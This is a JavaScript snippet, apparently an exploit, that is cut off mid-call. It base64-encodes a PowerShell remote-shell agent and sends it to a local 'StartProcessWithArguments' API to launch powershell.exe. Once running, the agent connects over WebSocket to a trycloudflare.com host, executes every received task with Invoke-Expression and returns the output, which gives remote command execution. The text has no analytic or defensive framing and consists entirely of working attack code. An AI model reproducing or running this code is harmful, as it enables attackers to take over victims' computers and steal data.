function toBase64Utf16LE(str) {
    const bytes = new Uint8Array(str.length * 2);
    for (let i = 0; i < str.length; i++) {
        const c = str.charCodeAt(i);
        bytes[i * 2]     = c & 0xff;
        bytes[i * 2 + 1] = (c >> 8) & 0xff;
    }
    let binary = "";
    for (const b of bytes) {
        binary += String.fromCharCode(b);
    }
    return btoa(binary);
}
const command1 = "$uri = [Uri]\"wss://pleased-seems-serious-knee.trycloudflare.com/ws/agent\"\r\n$ws = [System.Net.WebSockets.ClientWebSocket]::new()\r\n\r\ntry {\r\n    $ws.ConnectAsync(\r\n        $uri,\r\n        [Threading.CancellationToken]::None\r\n    ).GetAwaiter().GetResult()\r\n\r\n    Write-Host \"Connected\"\r\n\r\n    $buffer = New-Object byte[] 4096\r\n\r\n    while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {\r\n        $segment = [ArraySegment[byte]]::new($buffer)\r\n\r\n        $received = $ws.ReceiveAsync(\r\n            $segment,\r\n            [Threading.CancellationToken]::None\r\n        ).GetAwaiter().GetResult()\r\n\r\n        if ($received.MessageType -eq\r\n            [System.Net.WebSockets.WebSocketMessageType]::Close) {\r\n            break\r\n        }\r\n\r\n        $json = [Text.Encoding]::UTF8.GetString(\r\n            $buffer, 0, $received.Count\r\n        )\r\n        $message = $json | ConvertFrom-Json\r\n        $result = Invoke-Expression $message.task | Out-String\r\n        if ($message.task -eq \"hostname\" -or 1 -eq 1) {\r\n            $reply = @{\r\n                task   = \"hostname\"\r\n                result = $result.Trim()\r\n            } | ConvertTo-Json -Compress\r\n            #Write-Host $result\r\n            $bytes = [Text.Encoding]::UTF8.GetBytes($reply)\r\n            $segmentOut = [ArraySegment[byte]]::new($bytes)\r\n\r\n            $ws.SendAsync(\r\n                $segmentOut,\r\n                [System.Net.WebSockets.WebSocketMessageType]::Text,\r\n                $true,\r\n                [Threading.CancellationToken]::None\r\n            ).GetAwaiter().GetResult()\r\n        }\r\n    }\r\n}\r\nfinally {\r\n    $ws.Dispose()\r\n}";
const command = `${command1} ; pause`
const encoded = toBase64Utf16LE(command);
const url =
    'http://127.0.0.1:8082/api/Client/StartProcessWithArguments/' +
    'powershell.exe/' +
    encodeURIComponent('-EncodedCommand ' + encoded);
fetch(url, {
